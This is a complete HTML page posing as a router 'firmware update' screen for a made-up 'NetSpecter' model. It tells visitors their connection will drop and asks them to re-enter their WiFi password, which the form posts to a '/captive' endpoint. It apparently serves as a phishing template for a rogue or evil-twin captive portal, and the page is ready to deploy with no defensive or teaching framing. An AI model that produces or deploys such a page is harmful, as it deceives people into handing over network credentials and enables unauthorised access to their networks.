<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Router Firmware Update — Re-authentication Required</title>
<style>
  :root {
    --bg: #0a0e1a;
    --card: #131826;
    --accent: #00d4aa;
    --text: #e4e7ee;
    --muted: #8a92a6;
    --error: #ff5470;
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
    background: var(--bg);
    color: var(--text);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 1rem;
  }
  .card {
    background: var(--card);
    border: 1px solid #1f2638;
    border-radius: 12px;
    padding: 2.5rem 2rem;
    max-width: 420px;
    width: 100%;
    box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
  }
  .brand {
    text-align: center;
    margin-bottom: 1.5rem;
  }
  .brand .logo {
    display: inline-block;
    width: 56px;
    height: 56px;
    border-radius: 50%;
    background: linear-gradient(135deg, var(--accent), #00a386);
    margin-bottom: 0.75rem;
    position: relative;
  }
  .brand .logo::before {
    content: "";
    position: absolute;
    top: 50%;
    left: 50%;
    width: 14px;
    height: 14px;
    border: 3px solid var(--bg);
    border-radius: 50%;
    transform: translate(-50%, -50%);
  }
  h1 {
    font-size: 1.1rem;
    font-weight: 600;
    margin-bottom: 0.25rem;
  }
  .subtitle {
    color: var(--muted);
    font-size: 0.85rem;
    margin-bottom: 2rem;
    text-align: center;
  }
  .alert {
    background: rgba(255, 84, 112, 0.1);
    border: 1px solid rgba(255, 84, 112, 0.3);
    color: var(--error);
    padding: 0.75rem;
    border-radius: 8px;
    font-size: 0.85rem;
    margin-bottom: 1.5rem;
  }
  label {
    display: block;
    font-size: 0.85rem;
    color: var(--muted);
    margin-bottom: 0.4rem;
  }
  input[type="password"] {
    width: 100%;
    background: #0a0e1a;
    border: 1px solid #2a3144;
    border-radius: 8px;
    padding: 0.7rem 0.85rem;
    color: var(--text);
    font-size: 0.95rem;
    margin-bottom: 1.25rem;
  }
  input[type="password"]:focus {
    outline: none;
    border-color: var(--accent);
  }
  button {
    width: 100%;
    background: var(--accent);
    color: var(--bg);
    border: none;
    border-radius: 8px;
    padding: 0.75rem;
    font-size: 0.95rem;
    font-weight: 600;
    cursor: pointer;
    transition: filter 0.15s;
  }
  button:hover { filter: brightness(1.1); }
  .footer {
    text-align: center;
    color: var(--muted);
    font-size: 0.75rem;
    margin-top: 1.5rem;
  }
</style>
</head>
<body>
  <div class="card">
    <div class="brand">
      <div class="logo"></div>
      <h1>Firmware Update Required</h1>
    </div>
    <p class="subtitle">
      Your router is updating to the latest security patch. Please re-enter your
      WiFi password to continue.
    </p>
    <div class="alert">
      ⚠ Connection will drop until re-authentication is complete.
    </div>
    <form method="POST" action="/captive">
      <label for="password">WiFi Password</label>
      <input type="password" id="password" name="password" required autofocus>
      <button type="submit">Re-authenticate</button>
    </form>
    <p class="footer">
      Router model: NetSpecter / WiFi-6 AX1800<br>
      Firmware version: 3.0.0.4.388_24621
    </p>
  </div>
</body>
</html>
